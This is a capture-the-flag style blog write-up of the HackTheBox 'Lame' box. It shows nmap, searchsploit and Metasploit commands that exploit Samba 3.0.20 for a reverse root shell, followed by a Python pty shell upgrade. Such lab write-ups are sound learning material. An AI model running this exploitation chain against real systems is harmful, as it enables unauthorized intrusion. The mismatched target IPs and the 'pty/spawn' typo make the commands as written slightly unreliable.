---
title:      'Lame'
date:       '2022-01-21'
tag:        'htb'
subtag1:    'Linux'
subtag2:    'CVE'
subtag3:    'Samba'
---

###### Lame is a retired easy-ranked Linux machine on HacktheBox.


### INFORMATION GATHERING

---
##### nmap scan

![nmap scan](/images/boxes/lame/nmap.png "nmap scan")
```bash
nmap -sC -sV -Pn -oA Lame 10.10.10.40
```
Here we discover:
- vsftp 2.3.4 _(Anonymous Login permitted)_
- OpenSSH 4.7
- Samba 3.0.20

---
##### searchsploit

![searchsploit samba](/images/boxes/lame/searchsploit_samba.png "searchsploit samba")
```bash
searchsploit Samba 3.0.20
```
###### The searchsploit command queries the _/usr/share/exploitdb_ directory for possible exploits.

Here we discover:
- A Metasploit Command Execution exploit written in Ruby _(unix/remote/16320.rb)_


### EXPLOITATION

---
##### metasploit

![metasploit search](/images/boxes/lame/msf_search.png "metasploit search")
```bash
search Samba 3
use 4
```
We select the exploit discovered via the _searchsploit_ command
![metasploit options](/images/boxes/lame/msf_options.png "metasploit options")
```bash
set RHOSTS 10.10.10.3
set LHOST 10.10.14.19 
```
ready to exploit

---
##### exploited

![exploited](/images/boxes/lame/msf_exploit.png "exploited")
running the exploit pops a root shell

### POST EXPLOITATION

---
##### upgrade dumb shell
![upgrade dumb shell](/images/boxes/lame/upgrade_shell.png "upgrade dumb shell")
```bash
which python
python -c 'import pty;pty/spawn("/bin/bash")'
```
we find that python is installed and use the _pty_ module to spawn an interactive shell

---
##### exploration
![exploration](/images/boxes/lame/exploration.png "exploration")
we discover a user named _makis_

---
##### user.txt
![user flag](/images/boxes/lame/user_flag.png "user flag")
user flag was in the home directory of user _makis_

---
##### root.txt
![root flag](/images/boxes/lame/root_flag.png "root flag")
root flag was in the root directory

### SUMMARY

---
Lame is arguably the easiest Linux box on HackTheBox and requires the use of a common Samba vulnerability to immediately gain an elevated shell. It is, like _Blue_, a great introductory box for anyone interested in learning pentesting techniques as the barrier to entry is low, and the results are quick.
